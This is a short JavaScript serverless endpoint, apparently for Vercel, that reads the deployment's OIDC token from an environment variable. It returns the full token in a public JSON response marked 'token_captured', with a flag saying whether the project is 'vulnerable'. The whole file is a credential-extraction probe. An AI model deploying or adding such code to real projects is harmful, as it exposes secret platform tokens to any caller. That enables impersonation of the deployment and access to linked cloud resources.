export default async function handler(req, res) {
    // Vercel environment variables se direct token check karna
    const token = process.env.VERCEL_OIDC_TOKEN || "Not Found";
    
    res.status(200).json({
        vulnerable: token !== "Not Found" ? "YES" : "NO",
        message: "OIDC Token extraction attempt",
        token_captured: token
    });
}
